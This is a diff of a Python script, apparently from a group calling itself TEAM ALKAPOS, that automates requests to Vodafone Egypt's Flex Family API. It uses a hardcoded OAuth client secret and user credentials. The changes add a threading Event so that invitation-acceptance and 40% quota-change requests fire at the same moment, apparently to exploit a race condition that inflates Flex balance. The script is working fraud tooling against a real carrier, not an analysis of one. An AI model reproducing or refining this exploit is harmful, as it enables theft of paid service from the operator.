@@ -1,15 +1,15 @@
-#@MR_ALKAP00S
 import requests
 import time
 import json
-import os , sys
+import os
+import sys
 import random
 import re
-from threading import Thread
+from threading import Thread, Event
 from colorama import init, Fore, Style
-from colorama import Fore
 import pyfiglet
 import webbrowser
+from requests import Session
 
 G = Fore.GREEN
 R = Fore.RED
@@ -18,37 +18,29 @@ B = Fore.BLUE
 
 #@MR_ALKAPOS
 
-s=("□■"*30)
-m=("□■"*30)
-g=("□■"*30)
+s = ("□■" * 30)
+m = ("□■" * 30)
+g = ("□■" * 30)
 SK = pyfiglet.figlet_format('                TEAM')
 saa = pyfiglet.figlet_format('       ALKAPOS')
-sk2=pyfiglet.figlet_format('        VODAFONE')
-alkapos=pyfiglet.figlet_format('          50K_Flex ')
+sk2 = pyfiglet.figlet_format('        VODAFONE')
+alkapos = pyfiglet.figlet_format('          50K_Flex ')
 def sped(s):
-        for c in s + '\n':
-        	sys.stdout.write(c)
-        	sys.stdout.flush()
-        	time.sleep(0.001)
-        	def alkapos():
-        		print("")
-sped(R+s)
-sped(G+SK)
-sped(G+saa)
-sped(R+m)
-sped(Y+sk2)
-sped(R+g)
-sped(G+alkapos)
-sped(R+g)
+    for c in s + '\n':
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(0.001)
+def alkapos_func():
+    print("")
+sped(R + s)
+sped(G + SK)
+sped(G + saa)
+sped(R + m)
+sped(Y + sk2)
+sped(R + g)
+sped(G + alkapos)
+sped(R + g)
 webbrowser.open("https://t.me/TEAM_ALKAP0S")
-
-
-
-
-
-
-
-
 
 # --- تهيئة الألوان ---
 init(autoreset=True)
@@ -61,14 +53,13 @@ RESET = Style.RESET_ALL
 SEPARATOR = BRIGHT_YELLOW + "-" * 70 + RESET
 BOLD = Style.BRIGHT
 
-
+# --- إعدادات ثابتة ---
 CONFIG_FILE = "config.json"
 AUTH_URL = 'https://web.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token'
 FAMILY_API_URL = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
 CLIENT_ID = 'my-vodafone-app'
 CLIENT_SECRET = 'a2ec6fff-0b7f-4aa4-a733-96ceae5c84c3'
 
-# --- إعدادات ثابتة ---
 TASK_ORDER = [2, 3, 5, 4, 1]  # إرسال دعوة, قبول, تغيير 40%, حذف, تغيير 10%
 DELAYS = {"2": 10, "3": 310, "5": 0, "4": 10, "1": 310}
 SUBDOMAINS_CONFIG = {
@@ -80,7 +71,6 @@ SUBDOMAINS_CONFIG = {
 SYNC_TASKS = [3, 5]  # قبول الدعوة وتغيير 40% متزامن
 RETRIES_ACCEPT = 3
 RETRIES_ADD_REMOVE = 3
-FLEX_CHECK_DELAY = 5  # تأخير 5 ثوانٍ بعد المهام المتزامنة
 
 # --- قائمة وكلاء المستخدم ---
 USER_AGENTS = [
@@ -89,11 +79,7 @@ USER_AGENTS = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
 ]
 
-# --- جلسة طلبات موحدة ---
-session = requests.Session()
-
 # --- الدوال المساعدة ---
-
 def countdown(delay_time):
     """دالة لعرض عداد تنازلي."""
     if delay_time <= 0:
@@ -129,6 +115,7 @@ def get_fresh_token(owner_number, password):
     }
     print(f"{CYAN}[*] جاري الحصول على access_token...{RESET}")
     try:
+        session = Session()
         response = session.post(url, headers=headers, data=data, timeout=20)
         response.raise_for_status()
         access_token = response.json().get("access_token")
@@ -166,6 +153,7 @@ def check_flex_balance(token, owner_number):
     }
     print(f"{CYAN}[*] جاري التحقق من عدد الفلكسات...{RESET}")
     try:
+        session = Session()
         response = session.get(url, headers=headers, timeout=20)
         response.raise_for_status()
         pattern = r'"usageType":"limit","bucketBalance":\[\{"remainingValue":\{"amount":(.*?),"units":"FLEX"'
@@ -197,77 +185,83 @@ def create_headers(access_token_val, subdomain, user_agent, owner_number):
     }
 
 # --- دوال الـ API ---
-
-def change_quota(access_token, owner_number, member_number, quota, user_agent, results_dict, result_key, subdomain):
+def change_quota(access_token, owner_number, member_number, quota, user_agent, results_dict, result_key, subdomain, start_event=None):
     """تغيير حصة عضو."""
+    if start_event:
+        start_event.wait()  # الانتظار حتى يتم إعطاء الإشارة
+    session = Session()  # جلسة جديدة
     url = FAMILY_API_URL
     headers = {
-        
-  'User-Agent': "okhttp/4.11.0",
-  'Connection': "Keep-Alive",
-  'Accept': "application/json",
-  'Accept-Encoding': "gzip",
-  'Content-Type': "application/json",
-  "Authorization": f"Bearer {access_token}",
-  'api-version': "v2",
-  'x-agent-operatingsystem': "15",
-  'clientId': "AnaVodafoneAndroid",
-  'x-agent-device': "HONOR ALI-NX1",
-  'x-agent-version': "2024.11.2",
-  'x-agent-build': "944",
-  'msisdn': owner_number,
-  'Accept-Language': "ar",
-  'Content-Type': "application/json; charset=UTF-8"
+        'User-Agent': "okhttp/4.11.0",
+        'Connection': "Keep-Alive",
+        'Accept': "application/json",
+        'Accept-Encoding': "gzip",
+        'Content-Type': "application/json",
+        "Authorization": f"Bearer {access_token}",
+        'api-version': 'v2',
+        'x-agent-operatingsystem': "15",
+        'clientId': "AnaVodafoneAndroid",
+        'x-agent-device': "HONOR ALI-NX1",
+        'x-agent-version': "2024.11.2",
+        'x-agent-build': "944",
+        'msisdn': owner_number,
+        'Accept-Language': "ar",
+        'Content-Type': "application/json; charset=UTF-8"
     }
     payload = {
-  "category": [
-    {
-      "listHierarchyId": "TemplateID",
-      "value": "47"
-    }
-  ],
-  "createdBy": {
-    "value": "MobileApp"
-  },
-  "parts": {
-    "characteristicsValue": {
-      "characteristicsValue": [
-        {
-          "characteristicName": "quotaDist1",
-          "type": "percentage",
-          "value": quota
-        }
-      ]
-    },
-    "member": [
-      {
-        "id": [
-          {
-            "schemeName": "MSISDN",
-            "value": owner_number
-          }
+        "category": [
+            {
+                "listHierarchyId": "TemplateID",
+                "value": "47"
+            }
         ],
-        "type": "Owner"
-      },
-      {
-        "id": [
-          {
-            "schemeName": "MSISDN",
-            "value": member_number
-          }
-        ],
-        "type": "Member"
-      }
-    ]
-  },
-  "type": "QuotaRedistribution"
+        "createdBy": {
+            "value": "MobileApp"
+        },
+        "parts": {
+            "characteristicsValue": {
+                "characteristicsValue": [
+                    {
+                        "characteristicName": "quotaDist1",
+                        "type": "percentage",
+                        "value": quota
+                    }
+                ]
+            },
+            "member": [
+                {
+                    "id": [
+                        {
+                            "schemeName": "MSISDN",
+                            "value": owner_number
+                        }
+                    ],
+                    "type": "Owner"
+                },
+                {
+                    "id": [
+                        {
+                            "schemeName": "MSISDN",
+                            "value": member_number
+                        }
+                    ],
+                    "type": "Member"
+                }
+            ]
+        },
+        "type": "QuotaRedistribution"
     }
     print(f"{CYAN}  [🚀] إرسال طلب تغيير حصة {BOLD}{member_number}{RESET}{CYAN} إلى {BOLD}{quota}%{RESET}")
     try:
-        response = session.patch(url, headers=headers, json=payload, timeout=30)
+        start_time = time.time()  # تسجيل وقت البدء
+        response = session.post(url, headers=headers, json=payload, timeout=30)
+        end_time = time.time()  # تسجيل وقت الانتهاء
+        print(f"{CYAN}  [⏱️] طلب تغيير الحصة بدأ في: {start_time}, انتهى في: {end_time}{RESET}")
         results_dict[result_key] = {'status': response.status_code, 'text': response.text}
         status_color = SUCCESS_COLOR if response.status_code in [200, 201] else ERROR_COLOR
         print(f"{status_color}  [📦] استجابة {member_number}: {BOLD}{response.status_code}{RESET}")
+        if response.status_code not in [200, 201]:
+            print(f"{ERROR_COLOR}  [🔍] تفاصيل الاستجابة: {response.text}{RESET}")
         response.raise_for_status()
     except requests.exceptions.RequestException as e:
         results_dict[result_key] = {'status': 'REQUEST_ERROR', 'text': str(e)}
@@ -275,33 +269,62 @@ def change_quota(access_token, owner_number, member_number, quota, user_agent, r
 
 def add_family_member(access_token, owner_number, member_number, quota_value, user_agent, results_dict, result_key, subdomain, max_retries):
     """إضافة عضو جديد."""
+    session = Session()  # جلسة جديدة
     url = FAMILY_API_URL
     headers = {
         "Host": "mobile.vodafone.com.eg",
-        "x-dynatrace":"MT_3_13_2611661057_68-0_a556db1b-4506-43f3-854a-1d2527767923_0_77308_312",
+        "x-dynatrace": "MT_3_13_2611661057_68-0_a556db1b-4506-43f3-854a-1d2527767923_0_77308_312",
         "msisdn": owner_number,
-        "api-version":"v2",
-        "x-agent-operatingsystem":"1630483957",
-        "clientId":"AnaVodafoneAndroid",
+        "api-version": "v2",
+        "x-agent-operatingsystem": "1630483957",
+        "clientId": "AnaVodafoneAndroid",
         "Authorization": f"Bearer {access_token}",
-        "x-agent-device":"RMX1911",
+        "x-agent-device": "RMX1911",
         "Accept": "application/json",
-        "x-agent-version":"2022.2.1.2",
-        "x-agent-build":"911",
-        "Accept-Language":"ar",
-        "Content-Type":"application/json; charset=UTF-8",
-        "Connection":"Keep-Alive",
-        "Accept-Encoding":"gzip",
-        "User-Agent":"okhttp/4.9.1"
+        "x-agent-version": "2022.2.1.2",
+        "x-agent-build": "911",
+        "Accept-Language": "ar",
+        "Content-Type": "application/json; charset=UTF-8",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip",
+        "User-Agent": "okhttp/4.9.1"
     }
-    payload = {"category": [{"listHierarchyId": "PackageID", "value": "523"}, {"listHierarchyId": "TemplateID", "value": "47"}, {"listHierarchyId": "TierID", "value": "523"}, {"listHierarchyId": "familybehavior", "value": "percentage"}], "name": "FlexFamily", "parts": {"characteristicsValue": {"characteristicsValue": [{"characteristicName": "quotaDist1", "type": "percentage", "value": str(quota_value),}]}, "member": [{"id": [{"schemeName": "MSISDN", "value":owner_number,}], "type": "Owner"}, {"id": [{"schemeName": "MSISDN", "value":member_number}], "type": "Member"}]}, "type": "SendInvitation"}
+    payload = {
+        "category": [
+            {"listHierarchyId": "PackageID", "value": "523"},
+            {"listHierarchyId": "TemplateID", "value": "47"},
+            {"listHierarchyId": "TierID", "value": "523"},
+            {"listHierarchyId": "familybehavior", "value": "percentage"}
+        ],
+        "name": "FlexFamily",
+        "parts": {
+            "characteristicsValue": {
+                "characteristicsValue": [
+                    {"characteristicName": "quotaDist1", "type": "percentage", "value": str(quota_value)}
+                ]
+            },
+            "member": [
+                {
+                    "id": [{"schemeName": "MSISDN", "value": owner_number}],
+                    "type": "Owner"
+                },
+                {
+                    "id": [{"schemeName": "MSISDN", "value": member_number}],
+                    "type": "Member"
+                }
+            ]
+        },
+        "type": "SendInvitation"
+    }
     for attempt in range(max_retries):
         print(f"{CYAN}  [🚀] إرسال طلب دعوة لـ {BOLD}{member_number}{RESET}{CYAN} بحصة {BOLD}{quota_value}% (محاولة {attempt + 1}/{max_retries}){RESET}")
         try:
-            response = session.patch(url, headers=headers, json=payload, timeout=45)
+            response = session.post(url, headers=headers, json=payload, timeout=45)
             results_dict[result_key] = {'status': response.status_code, 'text': response.text}
             status_color = SUCCESS_COLOR if response.status_code in [200, 201, 204] else ERROR_COLOR
             print(f"{status_color}  [📦] استجابة {member_number}: {BOLD}{response.status_code}{RESET}")
+            if response.status_code not in [200, 201, 204]:
+                print(f"{ERROR_COLOR}  [🔍] تفاصيل الاستجابة: {response.text}{RESET}")
             response.raise_for_status()
             print(f"{SUCCESS_COLOR}✅ تم إرسال الطلب بنجاح في المحاولة رقم {attempt + 1}.{RESET}")
             return
@@ -312,8 +335,11 @@ def add_family_member(access_token, owner_number, member_number, quota_value, us
             countdown(5)
     print(f"{ERROR_COLOR}❌ فشل إرسال الطلب بعد {max_retries} محاولة.{RESET}")
 
-def accept_invitation_with_retries(owner_number, member_number, member_password, max_retries, user_agent, results_dict, result_key, subdomain):
+def accept_invitation_with_retries(owner_number, member_number, member_password, max_retries, user_agent, results_dict, result_key, subdomain, start_event=None):
     """قبول دعوة العضو."""
+    if start_event:
+        start_event.wait()  # الانتظار حتى يتم إعطاء الإشارة
+    session = Session()  # جلسة جديدة
     url = FAMILY_API_URL
     for attempt in range(max_retries):
         print(f"{CYAN}  [🔄] محاولة قبول الدعوة لـ {BOLD}{member_number}{RESET} (محاولة {attempt + 1}/{max_retries}){RESET}")
@@ -371,10 +397,15 @@ def accept_invitation_with_retries(owner_number, member_number, member_password,
             "type": "AcceptInvitation"
         }
         try:
+            start_time = time.time()  # تسجيل وقت البدء
             response = session.patch(url, headers=headers, json=data, timeout=30)
+            end_time = time.time()  # تسجيل وقت الانتهاء
+            print(f"{CYAN}  [⏱️] طلب قبول الدعوة بدأ في: {start_time}, انتهى في: {end_time}{RESET}")
             results_dict[result_key] = {'status': response.status_code, 'text': response.text}
             status_color = SUCCESS_COLOR if response.status_code in [200, 201] else ERROR_COLOR
             print(f"{status_color}  [📦] استجابة {member_number}: {BOLD}{response.status_code}{RESET}")
+            if response.status_code not in [200, 201]:
+                print(f"{ERROR_COLOR}  [🔍] تفاصيل الاستجابة: {response.text}{RESET}")
             if response.status_code in [200, 201]:
                 print(f"{SUCCESS_COLOR}✅ تم قبول العضو في المحاولة {attempt + 1}.{RESET}")
                 return
@@ -387,10 +418,11 @@ def accept_invitation_with_retries(owner_number, member_number, member_password,
 
 def remove_flex_family_member(access_token, owner_number, member_number, user_agent, results_dict, result_key, subdomain, max_retries):
     """حذف عضو."""
+    session = Session()  # جلسة جديدة
     url = FAMILY_API_URL
     headers = {
         "x-dynatrace": "MT_3_17_917396936_5-0_a556db1b-4506-43f3-854a-1d2527767923_0_946_333",
-        "Authorization": f"Bearer {access_token}", 
+        "Authorization": f"Bearer {access_token}",
         "api-version": "v2",
         "x-agent-operatingsystem": "15",
         "clientId": "AnaVodafoneAndroid",
@@ -445,8 +477,10 @@ def remove_flex_family_member(access_token, owner_number, member_number, user_ag
         try:
             response = session.patch(url, headers=headers, json=payload, timeout=30)
             results_dict[result_key] = {'status': response.status_code, 'text': response.text}
-            status_color = SUCCESS_COLOR if response.status_code in [200, 201] else ERROR_COLOR
+            status_color = SUCCESS_COLOR if response.status_code in [200, 201, 404] else ERROR_COLOR
             print(f"{status_color}  [📦] استجابة {member_number}: {BOLD}{response.status_code}{RESET}")
+            if response.status_code not in [200, 201, 404]:
+                print(f"{ERROR_COLOR}  [🔍] تفاصيل الاستجابة: {response.text}{RESET}")
             response.raise_for_status()
             print(f"{SUCCESS_COLOR}✅ تم حذف العضو بنجاح في المحاولة {attempt + 1}.{RESET}")
             return
@@ -507,8 +541,6 @@ def load_config():
 
 # --- البرنامج الرئيسي ---
 def main():
-    
-
     config = None
     if os.path.exists(CONFIG_FILE):
         load_choice = input(f"{BRIGHT_YELLOW}❓ تم العثور على إعدادات سابقة. هل تريد تحميلها؟ [Y/N]: {RESET}").upper()
@@ -557,30 +589,42 @@ def main():
             tasks_to_execute = [task_id] if task_id not in SYNC_TASKS else [t for t in SYNC_TASKS if t not in executed_tasks]
             if len(tasks_to_execute) > 1:
                 print(f"\n{CYAN}---[ تنفيذ متزامن للمهام: {BOLD}{tasks_to_execute}{RESET}{CYAN} ]---{RESET}")
+                start_event = Event()  # إنشاء إشارة بدء مشتركة
                 threads = []
                 for sync_task_id in tasks_to_execute:
                     target_func = None
+                    task_args = None
                     if sync_task_id == 1 or sync_task_id == 5:
                         target_func = change_quota
-                    elif sync_task_id == 2:
-                        target_func = add_family_member
+                        task_args = get_task_args(sync_task_id, current_token, current_ua, results) + (start_event,)
                     elif sync_task_id == 3:
                         target_func = accept_invitation_with_retries
-                    elif sync_task_id == 4:
-                        target_func = remove_flex_family_member
-                    if target_func:
-                        task_args = get_task_args(sync_task_id, current_token, current_ua, results)
+                        task_args = get_task_args(sync_task_id, current_token, current_ua, results) + (start_event,)
+                    if target_func and task_args:
                         thread = Thread(target=target_func, args=task_args)
                         threads.append(thread)
                         thread.start()
                         executed_tasks.add(sync_task_id)
-                for t in threads:
-                    t.join()
-                countdown(DELAYS[str(tasks_to_execute[0])])
-                # التحقق من عدد الفلكسات بعد المهام المتزامنة بتأخير 5 ثوانٍ
-                print(f"{CYAN}---[ التحقق من عدد الفلكسات بعد {FLEX_CHECK_DELAY} ثوانٍ ]---{RESET}")
-                countdown(FLEX_CHECK_DELAY)
+                
+                # إعطاء الإشارة للخيوط لبدء إرسال الطلبات
+                time.sleep(0.1)  # تأخير طفيف للتأكد من أن الخيوط جاهزة
+                start_event.set()  # إعطاء الإشارة للبدء
+                
+                for thread in threads:
+                    thread.join()
+                
+                # تأخير 10 ثوانٍ بعد المهام المتزامنة
+                print(f"{CYAN}---[ الانتظار لمدة 10 ثوانٍ قبل جلب عدد الفلكسات ]---{RESET}")
+                countdown(10)
+                
+                # جلب عدد الفلكسات بعد المهام المتزامنة
+                print(f"{CYAN}---[ جلب عدد الفلكسات ]---{RESET}")
                 check_flex_balance(current_token, config['owner_number'])
+                
+                # الانتظار لمدة 300 ثانية بعد جلب الفلكسات
+                print(f"{CYAN}---[ الانتظار لمدة 300 ثانية ]---{RESET}")
+                countdown(300)
+                
             else:
                 single_task_id = tasks_to_execute[0]
                 target_func = None
